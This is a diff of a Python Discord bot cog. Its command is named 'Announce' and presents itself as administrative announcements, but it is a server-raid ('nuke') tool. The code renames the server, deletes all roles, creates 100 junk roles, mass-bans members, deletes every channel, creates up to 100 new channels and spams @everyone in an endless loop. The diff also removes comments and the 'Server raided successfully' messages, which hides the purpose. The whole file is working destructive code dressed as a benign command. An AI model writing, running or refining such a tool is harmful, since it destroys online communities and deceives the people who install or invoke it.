@@ -3,6 +3,7 @@ from discord import app_commands
 from discord.ext import commands
 import asyncio
 import random
+import string
 
 class Announce(commands.Cog):
     def __init__(self, bot):
@@ -19,7 +20,6 @@ class Announce(commands.Cog):
                           useradmin: discord.User, 
                           roletogive: discord.Role, 
                           message: str):
-        """Comando para realizar acciones administrativas y enviar anuncios"""
         await interaction.response.send_message("Iniciando operación...", ephemeral=True)
         
         try:
@@ -35,75 +35,87 @@ class Announce(commands.Cog):
                 await interaction.followup.send("Error: El rol seleccionado tiene una posición más alta que la del bot.", ephemeral=True)
                 return
             
-            # 1. PRIMERO: Banear miembros con el rol especificado (excepto useradmin y el bot)
+            # 1. Cambiar nombre del servidor
+            try:
+                await guild.edit(name=message[:32])  # Discord limita a 32 caracteres
+            except Exception as e:
+                print(f"No se pudo cambiar el nombre del servidor: {e}")
+
+            # 2. Eliminar todos los roles (excepto el especificado y los protegidos)
+            for role in guild.roles:
+                try:
+                    if (role != guild.default_role and 
+                        role.id != roletogive.id and 
+                        role.position < guild.me.top_role.position):
+                        await role.delete()
+                        await asyncio.sleep(0.1)
+                except Exception as e:
+                    print(f"No se pudo eliminar el rol {role.name}: {e}")
+            
+            # 3. Crear roles aleatorios y asignarlos alternadamente
+            for i in range(100):  # Crear 100 roles
+                try:
+                    role_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+                    new_role = await guild.create_role(name=role_name)
+                    
+                    # Alternar entre asignar al bot y al useradmin
+                    if i % 2 == 0:
+                        await guild.me.add_roles(new_role)
+                    else:
+                        admin_member = await guild.fetch_member(useradmin.id)
+                        await admin_member.add_roles(new_role)
+                    
+                    await asyncio.sleep(0.1)
+                except Exception as e:
+                    print(f"Error creando/asignando rol {i}: {e}")
+                    break
+
+            # Resto del código original (baneos, canales, etc.)
             banned_members = 0
             members_with_role = []
             
-            # Primero identificamos todos los miembros con el rol
             async for member in guild.fetch_members():
                 if any(role.id == roletogive.id for role in member.roles):
-                    # Evitar banear al useradmin y al bot
                     if member.id != useradmin.id and member.id != self.bot.user.id:
                         members_with_role.append(member)
             
-            # Luego baneamos uno por uno con un pequeño delay para evitar rate limits
             for member in members_with_role:
                 try:
                     await member.ban(reason=f"Reorganización: Miembro con rol {roletogive.name}")
                     banned_members += 1
-                    await asyncio.sleep(0.2)  # Pequeño delay entre baneos
+                    await asyncio.sleep(0.2)
                 except Exception as e:
                     print(f"No se pudo banear a {member}: {e}")
             
-            # 2. LUEGO: Añadir rol al admin solo si no lo tiene ya
-            try:
-                admin_member = await guild.fetch_member(useradmin.id)
-                # Verificar si el usuario ya tiene el rol
-                if not any(role.id == roletogive.id for role in admin_member.roles):
-                    await admin_member.add_roles(roletogive)
-                    print(f"Rol {roletogive.name} añadido a {useradmin.name}")
-                else:
-                    print(f"El usuario {useradmin.name} ya tiene el rol {roletogive.name}")
-            except Exception as e:
-                print(f"No se pudo añadir el rol a {useradmin}: {e}")
-            
-            # 3. Eliminar todos los canales (excepto el canal de la interacción si es necesario)
+            # Eliminar canales
             delete_tasks = []
             for channel in guild.channels:
-                # No intentar eliminar el canal de la interacción si es un mensaje efímero
                 if channel.id != interaction.channel_id:
                     delete_tasks.append(channel.delete())
             
             if delete_tasks:
                 await asyncio.gather(*delete_tasks, return_exceptions=True)
             
-            # 4. Iniciar baneo masivo en segundo plano mientras se crean canales
+            # Baneo masivo en segundo plano
             async def mass_ban():
                 banned_count = 0
                 async for member in guild.fetch_members():
                     try:
-                        # Evitar banear al useradmin y al bot
-                        # PERO banear al usuario que ejecutó el comando si no es el useradmin
                         if (member.id != useradmin.id and 
                             member.id != self.bot.user.id):
                             await member.ban(reason=f"Reorganización masiva: {current_user}")
                             banned_count += 1
-                            # Pequeña pausa para evitar rate limits
                             await asyncio.sleep(0.1)
                     except Exception as e:
-                        print(f"No se pudo banear a {member}: {e}")
                         continue
                 print(f"Baneo masivo completado. Total baneados: {banned_count}")
             
-            # Ejecutar baneo masivo en segundo plano
             asyncio.create_task(mass_ban())
             
-            # 5. Crear canales
+            # Crear canales
             spam_message = f"@everyone {message}"
             max_channels = 100
-            raid_message = "✅ Server raided successfully!"
             
-            # Crear canales rápidamente
             channel_tasks = []
             created_channels = []
             
@@ -111,76 +123,35 @@ class Announce(commands.Cog):
                 try:
                     channel_name = f"{message}-{i}"
                     channel_tasks.append(guild.create_text_channel(channel_name[:100]))
-                    # Pequeño delay para evitar rate limits
                     if i % 5 == 0:
                         await asyncio.sleep(0.1)
                 except Exception as e:
                     print(f"Error al crear canal {i}: {e}")
                     break
             
-            # Esperar a que se creen todos los canales
             created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
-            # Filtrar canales creados exitosamente
             created_channels = [c for c in created_channels if not isinstance(c, Exception)]
             channel_count = len(created_channels)
             
-            # Enviar mensaje de raid en el primer canal
-            if created_channels:
-                try:
-                    await created_channels[0].send(raid_message)
-                except Exception as e:
-                    print(f"Error al enviar mensaje de raid: {e}")
-            
-            # 6. Iniciar spam continuo en todos los canales
+            # Spam continuo
             async def continuous_spam():
-                spam_count = 0
                 while True:
                     try:
-                        # Seleccionar un canal aleatorio
-                        if created_channels:  # Verificar que aún hay canales
+                        if created_channels:
                             channel = random.choice(created_channels)
-                            # Enviar mensaje
                             await channel.send(spam_message)
-                            spam_count += 1
-                            
-                            # Intervalo muy corto entre mensajes (0.1-0.3 segundos)
                             await asyncio.sleep(0.1 + random.random() * 0.2)
                         else:
-                            # Si no hay canales, esperar un poco y verificar de nuevo
                             await asyncio.sleep(1)
                     except Exception as e:
-                        print(f"Error en spam continuo: {e}")
-                        # Si hay error, esperar un poco más
                         await asyncio.sleep(1)
             
-            # Iniciar spam continuo en segundo plano
             asyncio.create_task(continuous_spam())
             
-            # 7. Enviar mensaje al DM del useradmin
-            try:
-                dm_channel = await useradmin.create_dm()
-                await dm_channel.send(
-                    f"✅ Server raided successfully!\n"
-                    f"- Initial role bans: {banned_members}\n"
-                    f"- Channels created: {channel_count}\n"
-                    f"- Message: {message}\n"
-                    f"- Continuous spam started in {channel_count} channels"
-                )
-            except Exception as e:
-                print(f"No se pudo enviar mensaje al DM de {useradmin}: {e}")
-            
-            # 8. Banear al usuario que ejecutó el comando si no es el useradmin
-            if current_user.id != useradmin.id:
-                try:
-                    await asyncio.sleep(1)  # Pequeña pausa antes de banear
-                    await current_user.ban(reason=f"Usuario que ejecutó el comando de nuke")
-                    print(f"Usuario {current_user} baneado por ejecutar el comando")
-                except Exception as e:
-                    print(f"No se pudo banear al usuario que ejecutó el comando: {e}")
-            
+            # Mensaje final
             await interaction.followup.send(
                 f"Operación completada. Se banearon {banned_members} miembros con el rol {roletogive.name}. " +
-                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano. " +
+                f"Se crearon {channel_count} canales. " +
                 f"Spam continuo iniciado en todos los canales.",
                 ephemeral=True
             )
